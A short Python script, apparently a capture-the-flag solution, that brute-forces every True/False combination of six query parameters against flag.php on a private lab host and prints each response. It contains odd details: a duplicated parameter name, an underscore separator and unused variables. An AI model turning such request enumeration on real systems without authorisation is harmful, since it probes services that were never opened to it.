# pip install requests.

from itertools import product
import requests

a = 0
b = 0
c = 1
d = 2
e = 3
f = 4
g = 5

variables = ['ASKOZV', 'OXRVNQ', 'OMNEAS', 'ASKOZV', 'AMYHHR', 'BGLJGP']

combinations = list(product([True, False], repeat=6))

for combo in combinations:
    url = "http://10.0.0.6/ctf_deploy/accomplex/254sIh4xGs/flag.php?"
    for var, value in zip(variables, combo):
        url += f"{var}={value}_"
    url = url[:-1]  # Remove the trailing underscore

    try:
        response = requests.get(url)
        # You can check the response status code or content here
        print(f"URL: {url}, Status Code: {response.status_code}, Content: {response.text}")
    except requests.RequestException as e:
        print(f"Error making request to {url}: {e}")
